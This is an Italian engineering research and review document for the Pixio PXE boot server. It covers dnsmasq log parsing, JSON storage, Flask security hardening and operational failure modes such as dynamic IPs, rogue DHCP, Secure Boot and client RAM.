SYSLOG_RE = r"^(?P<mon>[A-Z][a-z]{2})\s+(?P<day>\d{1,2}) (?P<h>\d\d):(?P<m>\d\d):(?P<s>\d\d) (?P<rest>.*)$"   # niente anno: se nel futuro -> anno-1
DNSMASQ_RE = r"^(?:\S+ )?dnsmasq(?:-(?P<sub>dhcp|tftp|dns|script))?\[\d+\]: (?P<body>.*)$"
TXN_RE = r"^(?P<xid>\d+) (?P<msg>.*)$"      # xid presente solo con log-dhcp; correla le righe dello stesso scambio
PKT_RE = r"^(?P<kind>PXE|BOOTP|DHCP(?:DISCOVER|OFFER|REQUEST|ACK|NAK|INFORM|DECLINE|RELEASE))\((?P<iface>[^)]+)\) (?:(?P<ip>\d{1,3}(?:\.\d{1,3}){3}) )?(?P<mac>(?:[0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2})(?: ?(?P<extra>.*))?$"
   # PXE: extra = 'proxy' | 'proxy-ignored' | '<bootfile>' ; DHCPACK: extra = hostname ; DHCPDISCOVER: extra vuoto o messaggio errore (es. 'no address available')
VENDOR_RE = r"^vendor class: (?P<vc>.*)$"
ARCH_RE = r"^(?P<client>PXEClient|HTTPClient):Arch:(?P<arch>\d{5}):UNDI:(?P<undi>\d{6})$"   # arch decimale a 5 cifre (RFC 4578/IANA): 0 BIOS x86, 6 EFI ia32, 7 EFI x64 (bytecode), 9 EFI x64, 11 EFI arm64, 15 x86 HTTP, 16 x64 HTTP, 19 arm64 HTTP
ARCH_MAP = {0:'bios', 6:'efi32', 7:'efi64', 9:'efi64', 11:'arm64', 15:'http32', 16:'http64', 19:'httparm64'}
USERCLASS_RE = r"^user class: (?P<uc>.*)$"           # 'iPXE' => già in iPXE
TAGS_RE = r"^tags: (?P<tags>.*)$"  -> tags = [t.strip() for t in m['tags'].split(',')]   # contiene direttamente bios/efi32/efi64/efiarm64/ipxe/httpclient grazie ai dhcp-match set:... della config Pixio: via più robusta del vendor class
NAME_RE = r"^client provides name: (?P<name>.*)$"
BOOTFILE_RE = r"^bootfile name: (?P<file>\S+)$";  NEXTSERVER_RE = r"^next server: (?P<ip>\S+)$"
TFTP_SENT_RE = r"^sent (?P<path>\S+) to (?P<ip>\S+)$";  TFTP_ERR_RE = r"^(?:failed sending (?P<path2>\S+) to (?P<ip2>\S+)|file (?P<path3>\S+) not found for (?P<ip3>\S+)|error (?P<code>\d+) (?P<msg>.*) received from (?P<ip4>\S+))$"
Algoritmo consigliato: raggruppare per xid (dict xid -> {mac, ip, iface, vendor, userclass, tags, name, bootfile}); la riga PXE(...)/DHCPDISCOVER dà il MAC; le righe 'vendor class'/'tags' dello stesso xid danno l'arch; l'IP del client PXE in proxy mode NON compare nella riga PXE (proxy) — ricavarlo dal DHCP esistente non è possibile: usare l'access log nginx (GET /boot.ipxe?mac=... o la variabile ${ip} passata da iPXE come query) oppure la riga TFTP 'sent /srv/pixio/tftp/ipxe.efi to 10.10.0.55'.

journalctl (per il log dell'app): journalctl -u pixio.service -o json --no-pager -n 300 [--after-cursor=<__CURSOR>] ; campi utili: __CURSOR, __REALTIME_TIMESTAMP (microsecondi epoch, stringa decimale), MESSAGE (stringa o array di byte se non UTF-8), PRIORITY (0-7), SYSLOG_IDENTIFIER, _SYSTEMD_UNIT. Man: 'json ... Fields larger than 4096 bytes are encoded as null values'. Usare --after-cursor per il polling incrementale (doc: 'Start showing entries from the location in the journal after the location specified by the passed cursor'). Per dnsmasq, poiché la config Pixio usa log-facility=/var/log/pixio/dnsmasq.log, le righe NON vanno nel journal: leggere il file (tail degli ultimi 512 KiB) come già fatto; alternativa: togliere log-facility e usare journalctl -u dnsmasq -o json (SYSLOG_IDENTIFIER='dnsmasq-dhcp').
```

### 5. Struttura progetto, storage JSON atomico, job in thread, avvio gunicorn

*Fonte:* /opt/pixio (albero verificato), /opt/pixio/pixio/storage.py, services/jobs.py, services/background.py, /etc/systemd/system/pixio.service; man flock(2)/os.replace — *confidenza:* alta

```
/opt/pixio/                       (root:root 755 — NON scrivibile da pixio: contiene l'helper e il codice eseguito da root)
  wsgi.py                          from pixio import create_app; app = create_app()
  pixio/__init__.py                create_app(): config, ProxyFix, before_request guard, after_request headers, errorhandler JSON, register blueprints, background.start()
  pixio/config.py                  costanti percorsi (ETC_DIR, CONFIG_FILE, SECRET_FILE, STATE_DIR, LOG_DIR, HELPER)
  pixio/settings.py                load()/save() di /etc/pixio/config.json con deep_merge sui default
  pixio/storage.py                 read_json/write_json/update_json (flock + tmp + os.replace)
  pixio/auth.py                    blueprint auth (+ csrf, rate limit)
  pixio/privileged.py              call()/call_json() -> sudo -n pixio-helper
  pixio/blueprints/{boot.py (GET /boot.ipxe, /boot/<slug>.ipxe: pubblici), api_system.py, api_sources.py, api_catalog.py, api_menu.py, api_clients.py, api_logs.py, api_settings.py, api_upload.py, api_drivers.py}
  pixio/services/{catalog.py, detect.py, recipes.py, sources.py (cifs), ipxe_menu.py, clients.py, logs.py, jobs.py, background.py, system.py (psutil: disco, servizi), uploads.py, winpe.py}
  helper/pixio-helper              -> installato in /usr/local/sbin/pixio-helper (root 755)
  etc/{sudoers-pixio, nginx-pixio.conf.tpl, logrotate-pixio}   systemd/{pixio.service, pixio-mounts.service}
  bin/pixio-admin  static/ (SPA)  data/recipes.json  tests/  install.sh
Dati: /etc/pixio/{config.json 640 pixio, secret 600 pixio, sources/ 700 root (cred CIFS)}  /var/lib/pixio/{catalog.json, clients.json, sources.json, jobs/, uploads/}  /var/log/pixio/dnsmasq.log  /srv/pixio/{sources/<id> (CIFS ro), library, cache, http/{iso/<slug>, isofile/<slug>.iso, boot, drivers}, tftp, detect}
(NB: la spec ARCHITECTURE.md dice 'blueprints: auth, dashboard, isos, menu, settings, clients, logs, api' con template Jinja; l'implementazione reale è SPA + API JSON: per una SPA la separazione per risorsa api_*.py è più sensata dei blueprint 'dashboard'.)

# storage.py — pattern verificato (esistente):
def read_json(path, default=None):
    with open(path, encoding='utf-8') as f:
        fcntl.flock(f, fcntl.LOCK_SH)
        try: return json.load(f)
        finally: fcntl.flock(f, fcntl.LOCK_UN)
def write_json(path, data, mode=0o640):
    with _tlock(path):                        # RLock per path: serializza i thread dello stesso processo
        fd, tmp = tempfile.mkstemp(prefix='.tmp-', dir=os.path.dirname(path))
        with os.fdopen(fd, 'w', encoding='utf-8') as f:
            json.dump(data, f, ensure_ascii=False, indent=2, sort_keys=True); f.flush(); os.fsync(f.fileno())
        os.chmod(tmp, mode); os.replace(tmp, path)   # rename atomico sullo stesso filesystem
def update_json(path, fn, default=None): with _tlock(path): data = fn(read_json(path, default)); write_json(path, data); return data
# Nota: flock su file diversi (tmp vs path) non protegge lettori di ALTRI processi durante la scrittura; con 1 solo processo gunicorn + helper che legge solo config.json va bene; se serve cross-process usare un lockfile separato (path + '.lock') con LOCK_EX attorno a read+write.

# jobs.py: Job in threading.Thread(daemon=True), stato in memoria + snapshot /var/lib/pixio/jobs/<id>.json (KEEP=200); all'avvio i job 'running' su disco vengono marcati error 'interrotto'; EXCLUSIVE_TYPES=('scan',) ; API set_progress()/log()/cancelled.
# background.py: un thread demone (TICK 2 s) che fa parsing log client, check mount ogni 60 s, scansione periodica; ogni eccezione loggata.
# Copia ISO in cache: fare nell'app (utente pixio, /srv/pixio/cache 2775 pixio) con shutil.copyfileobj(src, dst, 16*1024*1024) aggiornando job.progress = copiati*100//size; scrivere su <dest>.part e os.replace a fine copia.

# Avvio: 1 worker è OBBLIGATORIO perché rate limit, job, cache journal e lock per-path sono in memoria; gthread (threads=8) dà concorrenza sufficiente. Con preload_app=False (default) va bene. Non usare --max-requests (riavvio del worker perderebbe i thread dei job).
```

### 6. Sicurezza web minima (CSRF senza flask-wtf, cookie, header, slug, path traversal, autoescape)

*Fonte:* https://flask.palletsprojects.com/en/stable/web-security/ ; /usr/lib/python3/dist-packages/flask/sansio/app.py:536 ; /usr/lib/python3/dist-packages/flask/app.py default_config ; /opt/pixio/pixio/__init__.py, auth.py — *confidenza:* alta

```
# CSRF: token in sessione + header (SPA) o hidden input (form):
def csrf_token():
    if 'csrf' not in session: session['csrf'] = secrets.token_urlsafe(32)
    return session['csrf']
def check_csrf():
    tok = request.headers.get('X-CSRF-Token') or (request.form.get('csrf') if request.form else None)
    if not tok or not hmac.compare_digest(tok, session.get('csrf', '')): abort(403, description='Token CSRF mancante o non valido')
# in before_request: if request.method in ('POST','PUT','PATCH','DELETE'): check_csrf()   (dopo il controllo login; escluso /api/auth/login che è pubblico)
# Per i form Jinja: <input type="hidden" name="csrf" value="{{ csrf_token() }}"> con app.jinja_env.globals['csrf_token'] = auth.csrf_token

# Cookie: SESSION_COOKIE_HTTPONLY=True (default), SESSION_COOKIE_SAMESITE='Lax' (default Flask = None => impostarlo), SESSION_COOKIE_SECURE=False finché la GUI è http:// (se True il browser non invia il cookie su http). Doc Flask: 'Lax prevents sending cookies with CSRF-prone requests from external sites, such as submitting a form.' Con SameSite=Lax il CSRF token è la seconda linea (browser vecchi, GET con side effect).

# Header (after_request):
resp.headers.setdefault('X-Frame-Options', 'DENY'); resp.headers.setdefault('X-Content-Type-Options', 'nosniff'); resp.headers.setdefault('Referrer-Policy', 'same-origin')
resp.headers.setdefault('Content-Security-Policy', "default-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'")   # SPA senza CDN: possibile e consigliato (doc Flask: 'A very strict policy would be: default-src self')
if request.path.startswith('/api/'): resp.headers['Cache-Control'] = 'no-store'

# Slug: SLUG_RE = re.compile(r'^[a-z0-9][a-z0-9._-]{0,63}$')  — usata sia nell'app sia nell'helper (doppia validazione). Escludere anche '..' esplicitamente? Con la regex '..' è ammesso come slug ('..' matcha [a-z0-9]? NO: il primo char deve essere [a-z0-9], quindi '..' e '.hidden' sono rifiutati; 'a..b' è ammesso ma non è traversal perché usato come singolo componente di path. OK.)

# Path traversal ISO: mai accettare path dal client; il client manda lo slug, il server ricava il path dal catalogo. Se si accetta un path relativo:
def safe_iso_path(rel, root='/srv/pixio/library'):
    rp = os.path.realpath(os.path.join(root, rel))
    if os.path.commonpath([rp, root]) != root or not rp.lower().endswith('.iso') or not os.path.isfile(rp): abort(400)
    return rp
# realpath risolve symlink (un symlink nella share verso /etc/shadow verrebbe rifiutato). Per upload nomi file: werkzeug.utils.secure_filename + controllo estensione.

# Autoescape: Flask 3.1 abilita autoescape per template con estensione .html .htm .xml .xhtml .svg (sansio/app.py select_jinja_autoescape) e per render_template_string (filename None -> True). Non usare |safe / Markup su input utente; quotare sempre gli attributi (<input value="{{ v }}">); per href evitare javascript: (CSP aiuta). Lo script iPXE (/boot.ipxe) NON è HTML: generarlo con f-string/str.join e validare i campi utente (nome voce: vietare newline, '#!ipxe' injection => rimuovere \r\n e limitare a [\x20-\x7e]).

# Limiti: MAX_CONTENT_LENGTH=None nell'app (upload chunk grandi) ma nginx client_max_body_size 0; impostare un limite per chunk nell'endpoint (es. request.content_length <= 64 MiB) e MAX_FORM_MEMORY_SIZE (default 500 kB) resta.
# TRUSTED_HOSTS (Flask >=3.1): opzionale, es. app.config['TRUSTED_HOSTS'] = [server_ip, hostname] — attenzione: i client PXE chiamano /boot.ipxe con Host=<ip>, quindi includere sempre l'IP.
# Rate limit login: vedi snippet 2.
```

### 7. Endpoint pubblici (/boot.ipxe, /boot/<slug>.ipxe, /pxe/*, /api/health) con before_request e allowlist

*Fonte:* /opt/pixio/pixio/__init__.py (PUBLIC_PREFIXES esistente), /opt/pixio/etc/nginx-pixio.conf.tpl, https://ipxe.org/cfg e https://ipxe.org/cfg/platform, docs/API.md — *confidenza:* alta

```
# nginx: /pxe/ è servito staticamente (alias /srv/pixio/http/) e NON passa da Flask => già pubblico; tutto il resto è proxy_pass a 127.0.0.1:8080.

PUBLIC_EXACT = {'/', '/index.html', '/boot.ipxe', '/api/health', '/api/auth/status', '/api/auth/login', '/favicon.ico'}
PUBLIC_PREFIXES = ('/boot/', '/static/')

@app.before_request
def _guard():
    p = request.path
    if p in PUBLIC_EXACT or p.startswith(PUBLIC_PREFIXES):
        return None
    if not auth.logged_in():
        if p.startswith('/api/'): return jsonify({'error': 'Accesso non autorizzato'}), 401
        abort(401)
    if request.method in ('POST', 'PUT', 'PATCH', 'DELETE'):
        auth.check_csrf()
    return None

# Perché match esatto + prefissi chiusi da '/': con startswith('/boot.ipxe') anche '/boot.ipxe-admin' sarebbe pubblico; '/boot/' pubblico è voluto (/boot/<slug>.ipxe). Registrare le route pubbliche in un blueprint 'boot' separato e aggiungere un test che enumeri app.url_map e verifichi che SOLO quelle route rispondano 200 senza cookie.
# /boot.ipxe: Response(script, mimetype='text/plain; charset=utf-8') con Cache-Control: no-store; iPXE non manda cookie né Accept: verificare che l'errorhandler restituisca testo (non JSON) per /boot*: nell'app esistente _http_err ritorna JSON anche per /boot — per iPXE è meglio '#!ipxe\necho <errore>\nshell' o un 404 testuale.
# Espansione lato client iPXE: il server genera un unico script usando le variabili built-in iPXE valutate dal client: ${platform} ('pcbios' | 'efi' | 'linux' — doc: 'iseq ${platform} efi && goto is_efi || goto not_efi'), ${buildarch} (i386/x86_64/arm64), ${mac}, ${ip}, ${next-server}, ${filename}, ${user-class}, ${uuid}, ${manufacturer}, ${product}, ${serial}, ${hostname}. Per il log client: chain http://<ip>/boot.ipxe?mac=${mac:hexhyp}&platform=${platform}&arch=${buildarch}  (il server può usare questi parametri, validati con regex MAC ^([0-9a-f]{2}-){5}[0-9a-f]{2}$, per aggiornare clients.json senza passare dal log dnsmasq).
# Nessun segreto in /boot.ipxe: contiene solo URL http://<ip>/pxe/... e nomi kernel; le ISO in /pxe/ sono comunque leggibili da chiunque in LAN (accettato dal modello: PXE non ha autenticazione).
```

### Trappole

- Ordine campi riga dnsmasq: 'TYPE(iface) [IP ]MAC [stringa]' — l'IP viene PRIMA del MAC; in proxyDHCP (config attuale) la riga è 'PXE(ens18) <mac> proxy' e NON contiene l'IP del client: l'IP va ricavato da TFTP 'sent ... to <ip>' o dall'access log nginx / query-string di /boot.ipxe.
- Il formato con xid ('%u %s(%s) ...') c'è SOLO con --log-dhcp (già attivo in /etc/dnsmasq.d/pixio.conf); senza, le righe non hanno xid e 'vendor class'/'tags' non vengono loggate affatto.
- dnsmasq logga su /var/log/pixio/dnsmasq.log (log-facility): 'journalctl -u dnsmasq' NON contiene le righe DHCP/PXE. Il file è dnsmasq:pixio 644 e va ruotato (etc/logrotate-pixio) con copytruncate o SIGHUP? dnsmasq riapre il log solo con restart: usare 'copytruncate' in logrotate.
- gunicorn 23 Debian: worker gevent/eventlet/tornado NON disponibili senza pacchetti extra (python3-gevent, python3-eventlet non installati); '--threads N>1' con worker sync passa automaticamente a gthread.
- SSE con gthread occupa 1 thread per tab per tutta la durata; con --threads 8 pochi admin saturano il pool. Con worker 'sync' una SSE più lunga di --timeout uccide il worker. Polling ogni 2 s è più robusto.
- Rate limit, job, lock in memoria funzionano SOLO con --workers 1: se un giorno si aumentano i worker, tutto va spostato su file/DB. Non usare --max-requests (ricicla il worker e perde i thread dei job).
- ProxyFix(x_for=1) è corretto solo se gunicorn ascolta esclusivamente su 127.0.0.1:8080 (verificato nel pixio.service); se ascoltasse su 0.0.0.0 chiunque potrebbe falsificare X-Forwarded-For e aggirare il rate limit per IP.
- sudoers: le wildcard '*' negli argomenti attraversano gli spazi ('Command line arguments are matched as a single, concatenated string'); usare regex ^...$ (sudo >= 1.9.10). Nella variante regex i caratteri , : = \\ non vanno escapati, solo '#'.
- Il file helper e OGNI directory del suo percorso devono essere root:root non scrivibili da pixio (verificato: /usr/local/sbin e /opt/pixio root 755); se /opt/pixio diventasse pixio-owned (es. 'git pull' come pixio) l'utente web potrebbe riscrivere l'helper = root.
- NoNewPrivileges=yes / ProtectSystem=strict in pixio.service romperebbero sudo (setuid): non usarli sull'unità dell'app; l'hardening va sull'helper (validazione) e su ProtectHome/PrivateTmp.
- Password (CIFS/Samba/admin) mai in argv: /proc/<pid>/cmdline è leggibile da tutti e sudo logga la riga di comando; passare via stdin (già fatto per write-source/samba-password). pixio-admin set-password attualmente passa la password come argv a python: cambiare in stdin.
- '_netdev' e 'nofail' passati a 'mount -o' da riga di comando sono opzioni fstab/systemd, ignorate da mount(8): innocue ma inutili nell'helper.
- Werkzeug 3.1: default 'scrypt:32768:8:1' e nessun attributo werkzeug.__version__ (rimosso): usare importlib.metadata.version('werkzeug'). Flask 3.2 rimuoverà flask.__version__ (DeprecationWarning già presente).
- SESSION_COOKIE_SAMESITE è None di default in Flask 3.1.1: va impostato esplicitamente a 'Lax'. SESSION_COOKIE_SECURE=True bloccherebbe il login su http://.
- Allowlist pubblica con startswith('/boot.ipxe') rende pubblico anche '/boot.ipxeXYZ': usare match esatto per i path senza slash finale; per '/boot/' e '/static/' il prefisso con slash è corretto.
- polkitd/pkexec non sono installati su questa Debian 13 minimale: l'opzione (c) richiederebbe apt install polkitd e comunque non coprirebbe mount/scrittura config.

### Domande aperte

- Vale la pena adottare la variante sudoers con regex sugli argomenti (difesa in profondità) o basta il singolo path? Se sì, ogni nuovo sottocomando dell'helper richiede l'aggiornamento del sudoers in install.sh (rischio: helper aggiornato ma sudoers no => 'sudo: a password is required' silenzioso; testare con 'sudo -l -U pixio').
- Il journal per l'app Pixio è letto con 'journalctl -n 300' a ogni poll (cache 2 s): con molte righe conviene passare a --after-cursor=<__CURSOR> (verificato nel man) e conservare il cursore in memoria.
- Errori su /boot.ipxe: l'errorhandler attuale restituisce JSON anche sui path /boot*; iPXE mostra meglio un testo '#!ipxe' con echo dell'errore — decidere il formato.
- Se in futuro si vuole HTTPS in LAN (cert interno), SESSION_COOKIE_SECURE=True e HSTS vanno abilitati solo allora; i client PXE devono continuare a usare http:// (iPXE dei pacchetti Debian non è compilato con DOWNLOAD_PROTO_HTTPS di default).

## Critica: Robustezza operativa e failure modes (rete, share CIFS, ISO, DHCP/dnsmasq, riavvio, RAM client, Secure Boot, IPv6, VLAN) — valutata su /opt/pixio/docs/ARCHITECTURE.md confrontata con l'implementazione reale in /opt/pixio (helper/pixio-helper, systemd/*, ipxe/embed.ipxe, pixio/services/*), sullo stato reale della macchina (ip -j addr, /etc/dnsmasq.d/pixio.conf, dpkg) e sulle fonti ufficiali (man dnsmasq 2.91, man mount.cifs 7.4, man systemd.mount, ipxe.org/secboot, ipxe.org/cmd/ifconf, ipxe.org/cfg/memsize, ipxe.org/wimboot, man live-boot, wiki.syslinux.org MEMDISK, discourse.ubuntu.com).

L'architettura è sensata per una PMI (proxyDHCP di default, helper privilegiato, mount CIFS soft con rimontaggio periodico, retry DHCP nell'embed iPXE) e il codice è già più avanti della spec in diversi punti. Ma ci sono tre buchi che in produzione rompono davvero le cose: l'IP del server è un lease DHCP dinamico su cui è cablato tutto (dnsmasq, iPXE embedded, samba); la modalità "DHCP completo" si attiva senza alcun rilevamento del DHCP esistente e con dhcp-authoritative (rischio concreto di rompere la LAN); Secure Boot viene liquidato con un avviso mentre dal 2.0.0 iPXE fornisce binari firmati via shim e non c'è alcun rilevamento del client che scarica ipxe.efi e lo rifiuta. Sotto: RAM del client non verificata (Ubuntu casper scarica l'intera ISO in RAM), nessun fallback quando la GUI è giù durante il boot (502 → shell iPXE), ISO sostituita/rimossa lascia loop mount stantii, VLAN e IPv6 non affrontati.

- **[alta] L'IP del server è un lease DHCP dinamico e tutto è cablato su quell'IP** — Fatto verificato sulla macchina: `ip -j addr show ens18` → `"dynamic": true, "noprefixroute": true, "valid_life_time": 80441` e /etc/network/interfaces ha `iface ens18 inet dhcp` (lease da 10.10.0.1, file /var/lib/dhcpcd/ens18.lease). Su 10.10.0.254 sono cablati: `dhcp-range=10.10.0.254,proxy`, tutti i `dhcp-boot=...,,10.10.0.254` e gli URL http://10.10.0.254/... in /etc/dnsmasq.d/pixio.conf; `__PIXIO_SERVER_IP__` nello script embedded compilato in iPXE (ipxe/build.sh); `interfaces = lo ens18` in smb.conf; server_ip in config.json. Se il DHCP esistente riassegna un altro indirizzo (reboot del router, pool riorganizzato, lease scaduto durante uno spegnimento lungo), dnsmasq con bind-dynamic ascolta sul nuovo IP ma continua a offrire il vecchio next-server/URL: i client scaricano niente o fanno chain verso un IP morto, senza alcun avviso in GUI. La spec non menziona il problema (dice solo 'IP ottenuto via DHCP').
  - *Correzione:* 1) install.sh e la pagina Impostazioni→Rete: leggere `ip -j addr show <iface>`; se `dynamic: true` mostrare un warning persistente in dashboard: «L'IP di Pixio è assegnato dal DHCP 10.10.0.1: crea una prenotazione per il MAC bc:24:11:19:26:97 oppure imposta un IP statico (/etc/network/interfaces: `iface ens18 inet static`)». 2) Watchdog nel thread di background (background.py, ogni MOUNT_CHECK_EVERY=60 s): confrontare `settings.iface_ip(iface)` con `network.server_ip`; se diversi → warning «IP cambiato da X a Y» + pulsante «Riallinea» che esegue `apply all` + `rebuild-ipxe <nuovo ip>` (il fallback dell'embed usa prima `${proxydhcp/next-server}`/`${next-server}`, quindi rigenerare dnsmasq basta per sbloccare i client anche prima della ricompilazione). 3) Opzione «Riallinea automaticamente» (default ON in modalità proxy).
- **[alta] Modalità 'DHCP completo' attivabile senza rilevare il DHCP esistente, con dhcp-authoritative** — pixio/blueprints/api_settings.py (righe ~95-113) valida solo che start<=end. render_dnsmasq() nell'helper in modalità full emette `dhcp-range=<start>,<end>,<netmask>,<lease>` + `dhcp-authoritative`. man dnsmasq(8): «--dhcp-authoritative Should be set when dnsmasq is definitely the only DHCP server on a network». Su questa LAN esiste già un DHCP (10.10.0.1, che ha assegnato l'IP a Pixio stesso): un tecnico che clicca 'DHCP completo' per provare mette due server autoritativi sulla stessa broadcast domain → i PC dell'ufficio ricevono lease casuali/gateway sbagliato; è il classico 'rogue DHCP' e dnsmasq non fa alcun rilevamento da solo.
  - *Correzione:* Nell'helper aggiungere `probe-dhcp <iface>`: invia un DHCPDISCOVER raw (socket UDP broadcast con SO_BINDTODEVICE, xid casuale, 3 s di attesa, eseguibile come root) e ritorna la lista degli OFFER (server-id, ip offerto, presenza opzioni 66/67). In api_settings, quando `dhcp_mode` passa a `full`: (a) se `ip -j addr` dell'interfaccia riporta `dynamic: true` → rifiuta con «Pixio riceve il proprio IP dal DHCP 10.10.0.1: non può diventare il server DHCP finché ha un IP statico»; (b) se il probe trova un OFFER da un server-id ≠ server_ip → rifiuta con il messaggio «Rilevato DHCP server attivo a <ip>: attivare Pixio in modalità completa creerebbe un conflitto e può interrompere la rete» e consenti l'override solo con checkbox esplicita 'Ho disattivato il DHCP esistente' + seconda conferma; (c) in modalità full non emettere `dhcp-authoritative` al primo apply, ma solo dopo un probe pulito; (d) in dashboard un grande pulsante «Ferma DHCP di Pixio» (kill switch: `systemctl stop dnsmasq`) visibile quando la modalità è full. Il probe va riusato anche in proxy mode per avvisare se l'OFFER del DHCP esistente contiene già opzioni 66/67 (WDS/altro PXE): «Il DHCP 10.10.0.1 fornisce già un boot server PXE: alcuni firmware ignoreranno Pixio».
- **[alta] Secure Boot: iPXE auto-compilato non firmato, nessun rilevamento, e la soluzione ufficiale (binari firmati via shim) non è considerata** — La spec dice 'iPXE compilato da sorgente' e la GUI/ricetta si limita a «Secure Boot deve essere disattivato sul PC (iPXE non è firmato)» (data/recipes.json:54, static/app.js:511). Con SB attivo il firmware scarica ipxe.efi via TFTP (compare nel log dnsmasq come trasferimento riuscito) e poi lo rifiuta senza messaggio o con 'Access Denied' e passa al boot device successivo: dal lato Pixio sembra che tutto funzioni. Fonti: netboot.xyz KB «Standard iPXE binaries are not signed with a key trusted by the Microsoft UEFI Secure Boot Certificate Authority ... will therefore be rejected by firmware with Secure Boot enabled»; ipxe.org/secboot: «The Secure Boot shim (e.g. ipxe-shim.efi or snponly-shim.efi) will automatically load the iPXE binary with the corresponding name (e.g. ipxe.efi or snponly.efi)», download https://github.com/ipxe/ipxe/releases/latest/download/ipxeboot.tar.gz, e «You cannot build your own version of iPXE with the precise features that you need, because UEFI Secure Boot is specifically designed to stop you from doing that» (quindi niente script embedded); wimboot: «This is a hybrid binary that will work on both BIOS and 64-bit UEFI systems (including UEFI systems with Secure Boot enabled)» (ipxe.org/wimboot); per Linux serve il comando `shim` con lo shim firmato della distro. Nota: i sorgenti in /opt/pixio/ipxe/src hanno `#define SHIM_CMD` attivo (src/config/general.h:123).
  - *Correzione:* 1) Rilevamento (implementabile subito in services/clients.py, che già parsa il log dnsmasq): se per un MAC/IP compare `sent /srv/pixio/tftp/ipxe.efi to <ip>` e NON arriva una GET /boot.ipxe?platform=efi entro 60 s, marcare il client 'iPXE scaricato ma non eseguito: probabile Secure Boot attivo' con il testo da mostrare: «Il PC ha scaricato iPXE ma non lo ha avviato. Quasi certamente Secure Boot è attivo: disattivalo nel firmware (UEFI → Security → Secure Boot → Disabled) oppure attiva in Impostazioni 'Binari iPXE firmati'. Windows 11 può essere installato con Secure Boot disattivato e riattivato dopo l'installazione». 2) Opzione GUI 'Secure Boot: usa i binari firmati' (default OFF): install.sh scarica ipxeboot.tar.gz in /srv/pixio/tftp/sb/ (tenere anche `/srv/pixio/http/tftp` symlink per HTTP Boot); dnsmasq per efi64: `pxe-service=tag:!ipxe,X86-64_EFI,"Pixio (UEFI x64)",sb/x86_64/ipxe-shim.efi` e `dhcp-boot=tag:httpclient,tag:http64,http://<ip>/pxe/tftp/sb/x86_64/ipxe-shim.efi,,<ip>`; siccome non c'è embed, mettere accanto ai binari un `autoexec.ipxe` con lo stesso contenuto di embed.ipxe (fallback `chain http://<ip>/boot.ipxe`) — confidenza media sul meccanismo autoexec (la pagina ipxe.org/secboot dice che si controlla il boot via autoexec.ipxe nello stesso percorso; verificare in QEMU/OVMF). 3) Nel menu generato per platform=efi, se la modalità firmata è attiva, mostrare '(non con Secure Boot)' sulle voci Linux senza ricetta shim, e aggiungere per Ubuntu/Debian/Fedora una ricetta opzionale `shim <iso>/EFI/boot/bootx64.efi` + kernel firmato della distro (non banale: pianificarla, non prometterla). Aggiornare la spec: 'Secure Boot: supportato solo con i binari firmati iPXE ≥ 2.0.0; Windows via wimboot OK; Linux caso per caso'.
- **[alta] RAM del client non stimata né verificata: Ubuntu casper, live fetch=, memdisk, sanboot e wimboot caricano tutto in RAM** — La spec cita solo 'RAM >= 2 GB' per Windows. In realtà: Ubuntu `boot=casper url=http://.../<slug>.iso` scarica l'intera ISO in RAM (discourse.ubuntu.com/t/14510: «the new installer downloads the entire ISO image into RAM»; ISO desktop 24.04 ≈ 5.8 GB → servono ≥ 8 GB, e dal 22.10 si usa `iso-url=` per evitare download multipli); Debian live/Clonezilla/GParted `fetch=`: man live-boot(7) «The fetch method copies the image to RAM»; Fedora live `root=live:http://...` idem; memdisk: «simula un disco richiedendo una parte della memoria elevata» = ISO intera in RAM e «la maggior parte delle distribuzioni Linux basate su ISO non funzionerà con l'emulazione MEMDISK» (wiki.syslinux.org MEMDISK); wimboot tiene boot.wim (500–700 MB su Win11) in RAM. data/recipes.json ha già note testuali (righe 54, 99, 202, 237, 340, 563) ma nulla è mostrato nel menu iPXE e nulla viene verificato: il PC da 4 GB dell'ufficio va in kernel panic/'out of memory' a metà download, che per il tecnico sembra un problema di rete.
  - *Correzione:* 1) Al detect calcolare `ram_min_mb` per ISO: windows = boot.wim×1.5+1024; ubuntu-casper/memdisk/sanboot = size ISO+1536; live fetch/fedora-live = squashfs+1024; salvarlo nel catalogo e mostrarlo nella tabella ISO e nell'item del menu (es. «Ubuntu 24.04  [≥ 8 GB RAM]»). 2) Compilare iPXE con `#define MEMMAP_SETTINGS` in config/local/settings.h (oggi commentato: src/config/settings.h:27) per avere `${memsize}` (ipxe.org/cfg/memsize: memoria in MB, int32). 3) Nel menu passare `&mem=${memsize}` a /boot/<slug>.ipxe; il server, se mem < ram_min, restituisce uno script che avvisa «RAM rilevata X MB, servono almeno Y MB per questa voce» con `prompt --key 0x0d --timeout 15000 Premi INVIO per provare comunque... || exit 1`. 4) Per Ubuntu ≥ 22.10 usare `iso-url=` al posto di `url=`; documentare che il generico memdisk è solo per piccole ISO (DOS/diagnostica).
- **[alta] Riavvio: per 1–4 minuti i client ottengono iPXE ma /boot.ipxe risponde 502 e lo script embedded finisce in shell senza retry** — Ordine reale: dnsmasq.service (After=network-online.target) e nginx partono subito; pixio-mounts.service attende fino a 60 s la default route (ExecStartPre con loop `seq 60`) e poi `pixio-helper mount-all` che monta le sorgenti IN SERIE con `timeout=60` ciascuna (cmd_mount_cifs); pixio.service è `After=pixio-mounts.service`, quindi gunicorn parte solo dopo (TimeoutStartSec=180). I loop mount delle ISO non sono persistenti: vengono rifatti da `_startup()` del thread background (`remount_enabled`) dopo che gunicorn è su. Nel frattempo: nginx `proxy_pass http://127.0.0.1:8080` → 502; ipxe/embed.ipxe fa `chain --autofree http://.../boot.ipxe && goto done ||` una sola volta per ciascun URL e poi `goto failed` → `shell`: il tecnico vede una shell iPXE e non capisce. Con 3 share irraggiungibili al boot (server file spento) la GUI è indisponibile fino a ~3 minuti.
